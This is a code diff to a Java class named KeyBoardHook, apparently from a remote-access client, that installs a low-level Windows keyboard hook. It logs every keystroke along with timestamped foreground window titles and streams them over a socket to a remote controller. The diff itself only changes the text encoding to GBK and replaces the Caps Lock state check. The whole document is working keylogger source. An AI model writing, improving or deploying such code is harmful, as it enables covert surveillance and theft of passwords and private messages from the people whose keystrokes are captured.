@@ -2,10 +2,11 @@ package me.client.send;
 
 import com.sun.jna.platform.win32.*;
 import me.client.utils.LoadDLL;
+import me.client.utils.LoadUser32;
 import me.client.utils.MessageFlags;
 import me.client.utils.SendMessage;
 
-import javax.jws.soap.SOAPBinding;
+import java.io.UnsupportedEncodingException;
 import java.net.Socket;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -28,21 +29,38 @@ public class KeyBoardHook extends Thread{
                     hwnd = User32.INSTANCE.GetForegroundWindow();
                     User32.INSTANCE.GetWindowText(hwnd,lpString,260);
                     String title = "\n" + "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
-                    SendMessage.Send(MessageFlags.UPDATE_KEYBORAD,
-                            title.getBytes(),socket);
+                    try {
+                        SendMessage.send(MessageFlags.UPDATE_KEYBORAD,
+                                title.getBytes("GBK"),socket);
+                    } catch (UnsupportedEncodingException e) {
+                    }
                 }
                     String str = String.valueOf(Win32VK.fromValue(event.vkCode)).replace("VK_", "");
                 if (str.length() >= 2) {
                     if (event.vkCode == 0x0D) {
-                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, "\n".getBytes(), socket);
+                        try {
+                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, "\n".getBytes("GBK"), socket);
+                        } catch (UnsupportedEncodingException e) {
+                            throw new RuntimeException(e);
+                        }
                     } else {
-                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, ("[" + str + "]").getBytes(), socket);
+                        try {
+                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, ("[" + str + "]").getBytes("GBK"), socket);
+                        } catch (UnsupportedEncodingException e) {
+                            throw new RuntimeException(e);
+                        }
                     }
                 } else {
-                    if (LoadDLL.instance.KeyState() == 0) {
-                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.toLowerCase().getBytes(), socket);
+                    if (LoadUser32.instance.GetKeyState(0x14).equals(new WinDef.SHORT(0))) {
+                        try {
+                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, str.toLowerCase().getBytes("GBK"), socket);
+                        } catch (UnsupportedEncodingException e) {
+                        }
                     } else {
-                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.getBytes(), socket);
+                        try {
+                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, str.getBytes("GBK"), socket);
+                        } catch (UnsupportedEncodingException e) {
+                        }
                     }
                 }
             }
@@ -56,8 +74,11 @@ public class KeyBoardHook extends Thread{
         hwnd = User32.INSTANCE.GetForegroundWindow();
         User32.INSTANCE.GetWindowText(hwnd,lpString,260);
         String title = "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
-        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD,
-                title.getBytes(),socket);
+        try {
+            SendMessage.send(MessageFlags.UPDATE_KEYBORAD,
+                    title.getBytes("GBK"),socket);
+        } catch (UnsupportedEncodingException e) {
+        }
         while (run) {
             setHookOn();
         }
